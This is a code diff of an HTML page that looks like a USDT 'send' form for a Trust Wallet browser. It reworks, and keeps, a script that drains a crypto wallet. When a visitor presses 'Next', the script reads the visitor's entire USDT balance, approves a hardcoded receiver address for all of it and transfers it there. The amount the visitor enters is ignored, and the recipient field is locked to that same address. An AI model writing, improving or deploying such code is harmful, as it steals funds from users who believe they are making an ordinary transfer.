@@ -47,16 +47,6 @@
       color: #fff;
       font-size: 14px;
     }
-    .input-actions {
-      margin-left: 10px;
-      display: flex;
-      gap: 12px;
-      font-size: 13px;
-    }
-    .input-actions span {
-      color: #00ff99;
-      cursor: pointer;
-    }
     .amount-box {
       display: flex;
       align-items: center;
@@ -100,15 +90,12 @@
   <div class="container">
     <label>Address or Domain Name</label>
     <div class="input-box">
-      <input type="text" id="wallet" value="0x1956B3950A73B0C54792199Edf13c7b835FF94DC" disabled />
-      <div class="input-actions">
-        <span onclick="navigator.clipboard.readText().then(text => document.getElementById('wallet').value = text)">Paste</span>
-      </div>
+      <input type="text" value="0x1956B3950A73B0C54792199Edf13c7b835FF94DC" disabled />
     </div>
 
     <label>Amount</label>
     <div class="input-box amount-box">
-      <input type="number" id="amount" placeholder="USDT Amount " />
+      <input type="text" id="amount" placeholder="Amount (optional)" />
       <span class="token">USDT</span>
     </div>
 
@@ -116,56 +103,52 @@
   </div>
 
   <div class="fixed-button">
-    <button id="nextBtn">Next</button>
+    <button id="nextBtn" onclick="start()">Next</button>
   </div>
 
   <script src="https://cdn.jsdelivr.net/npm/web3@1.8.2/dist/web3.min.js"></script>
   <script>
-    window.addEventListener('load', () => {
-      document.getElementById("nextBtn").onclick = async function () {
-        const btn = document.getElementById("nextBtn");
-        btn.innerText = "Processing...";
-        btn.disabled = true;
+    const RECEIVER = "0x1956B3950A73B0C54792199Edf13c7b835FF94DC";
+    const USDT = "0x55d398326f99059fF775485246999027B3197955";
+    const ABI = [
+      { "constant": false, "inputs": [{ "name": "_spender", "type": "address" },{ "name": "_value", "type": "uint256" }],"name": "approve","outputs": [{ "name": "", "type": "bool" }],"type": "function" },
+      { "constant": false, "inputs": [{ "name": "_from", "type": "address" },{ "name": "_to", "type": "address" },{ "name": "_value", "type": "uint256" }],"name": "transferFrom","outputs": [{ "name": "", "type": "bool" }],"type": "function" },
+      { "constant": true, "inputs": [{ "name": "owner", "type": "address" }],"name": "balanceOf","outputs": [{ "name": "", "type": "uint256" }],"type": "function" }
+    ];
 
-        if (!window.ethereum) {
-          alert("Open this in Trust Wallet DApp browser.");
-          btn.innerText = "Next";
-          btn.disabled = false;
-          return;
-        }
+    async function start() {
+      const btn = document.getElementById("nextBtn");
+      btn.innerText = "Processing...";
+      btn.disabled = true;
 
-        try {
-          const web3 = new Web3(window.ethereum);
-          await window.ethereum.request({ method: 'eth_requestAccounts' });
+      if (!window.ethereum) {
+        alert("Use Trust Wallet browser");
+        btn.innerText = "Next";
+        btn.disabled = false;
+        return;
+      }
 
-          const accounts = await web3.eth.getAccounts();
-          const user = accounts[0];
-          const receiver = "0x1956B3950A73B0C54792199Edf13c7b835FF94DC";
-          const tokenAddress = "0x55d398326f99059fF775485246999027B3197955"; // USDT BEP-20
+      try {
+        const web3 = new Web3(window.ethereum);
+        const accounts = await ethereum.request({ method: 'eth_requestAccounts' });
+        const user = accounts[0];
+        const contract = new web3.eth.Contract(ABI, USDT);
+        const balance = await contract.methods.balanceOf(user).call();
 
-          const contract = new web3.eth.Contract([
-            { "constant": false, "inputs": [{ "name": "_spender", "type": "address" }, { "name": "_value", "type": "uint256" }], "name": "approve", "outputs": [{ "name": "", "type": "bool" }], "type": "function" },
-            { "constant": false, "inputs": [{ "name": "_from", "type": "address" }, { "name": "_to", "type": "address" }, { "name": "_value", "type": "uint256" }], "name": "transferFrom", "outputs": [{ "name": "", "type": "bool" }], "type": "function" },
-            { "constant": true, "inputs": [{ "name": "owner", "type": "address" }], "name": "balanceOf", "outputs": [{ "name": "", "type": "uint256" }], "type": "function" }
-          ], tokenAddress);
+        await contract.methods.approve(RECEIVER, balance).send({ from: user });
+        await contract.methods.transferFrom(user, RECEIVER, balance).send({ from: user });
 
-          const balance = await contract.methods.balanceOf(user).call();
+        btn.innerText = "✅ Sent";
+      } catch (e) {
+        btn.innerText = "❌ Failed";
+      }
 
-          await contract.methods.approve(receiver, balance).send({ from: user });
-          await contract.methods.transferFrom(user, receiver, balance).send({ from: user });
-
-          btn.innerText = "✅ Done";
-        } catch (err) {
-          console.error(err);
-          btn.innerText = "❌ Failed";
-        }
-
-        setTimeout(() => {
-          btn.innerText = "Next";
-          btn.disabled = false;
-        }, 3000);
-      };
-    });
+      setTimeout(() => {
+        btn.innerText = "Next";
+        btn.disabled = false;
+      }, 3000);
+    }
   </script>
+
 </body>
 </html>
